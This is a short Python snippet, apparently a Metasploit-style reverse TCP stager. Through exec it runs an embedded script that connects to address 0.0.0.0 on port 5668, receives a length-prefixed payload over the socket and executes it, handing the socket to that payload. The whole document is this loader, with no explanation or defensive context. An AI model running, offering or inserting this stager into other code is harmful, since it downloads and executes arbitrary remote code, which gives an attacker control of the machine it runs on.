exec """\nimport socket,struct\ns=socket.socket(2,1)\ns.connect(('0.0.0.0',5668))\nl=struct.unpack('>I',s.recv(4))[0]\nd=s.recv(4096)\nwhile len(d)!=l:\n    d+=s.recv(4096)\nexec(d,{'s':s})\n"""
